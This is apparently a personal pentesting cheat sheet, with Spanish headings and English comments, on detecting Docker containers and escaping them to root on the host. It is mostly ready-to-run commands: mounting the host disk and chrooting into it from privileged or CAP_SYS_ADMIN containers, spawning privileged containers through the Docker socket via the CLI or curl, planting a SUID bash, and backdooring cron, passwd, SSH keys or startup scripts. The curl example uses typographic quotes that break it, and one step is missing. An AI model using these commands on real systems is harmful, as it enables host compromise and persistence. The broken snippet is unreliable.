# Contenedor?
```zsh
ls -la /.dockerenv

ls -la / | grep dockerenv

cat /proc/1/cgroup | grep "docker"

mount | grep ' / ' ## Buscar "overlay"

ps aux ## Cantidad de procesos, ausencia de workers

hostname ## Random hex

env | grep -i docker

df -h ## Filesystem anormalmente mínimo
```

# Contenedor privilegiado
```zsh
ip link add dummy0 type dummy 
## Si esto funciona, el cont. es privilegiado
```
## Escalar

```zsh
# List available disks
fdisk -l

# Create mount point
mkdir /mnt/host

# Mount the host root filesystem
mount /dev/sda1 /mnt/host

# Chroot into it
chroot /mnt/host bash

# You’re now root on the host
id
```

# Capabilities
```zsh
capsh --print

cat /proc/self/status | grep Cap

# Check if CAP_SYS_ADMIN is set
capsh --print | grep sys_admin

# If yes, mount host filesystem
mkdir /mnt/host
mount -t ext4 /dev/sda1 /mnt/host
chroot /mnt/host bash
```

# Docker socket
```zsh
ls -la /var/run/docker.sock
```

Si hay acceso al socket es posible spawnear un cont. privilegiado

```zsh
# Check docker version
docker version

# Spawn a new privileged container with host root mounted
docker run -v /:/host -it alpine chroot /host bash
```
## Docker no está instalado:

```zsh
# Install Docker client in the container first
apk add docker  # Alpine
# or
apt-get update && apt-get install docker.io  # Debian/Ubuntu

# Then run the escape
docker run -v /:/host -it alpine chroot /host bash
```
## Docker no se puede instalar

```sh
# List containers via Docker API
curl --unix-socket /var/run/docker.sock http://localhost/containers/json

# Create a privileged container
curl --unix-socket /var/run/docker.sock -X POST \
  -H “Content-Type: application/json” \
  -d ‘{”Image”:”alpine”,”Cmd”:[”/bin/sh”],”HostConfig”:{”Binds”:[”/:/host”],”Privileged”:true}}’ \
  http://localhost/containers/create

# Start it and attach
```

# Host Path Mounts

Containers often have host directories mounted for logs, configs, or shared data. If you’re root in the container and a sensitive directory is mounted with write access, you can modify files on the host.

**Classic example: SUID binaries**

If `/tmp` or any host directory is mounted, drop a SUID `bash` binary:

```
cp /bin/bash /mnt/bash
chown root:root /mnt/bash
chmod 4777 /mnt/bash
```

From the host, run `./bash -p` and you’re root.

**Other targets:**

- `/etc` mounted? Add cron jobs or modify `/etc/passwd`
    
- `/root` mounted? Drop SSH keys
    
- Application directories? Backdoor startup scripts

https://www.kayssel.com/post/docker-security-2/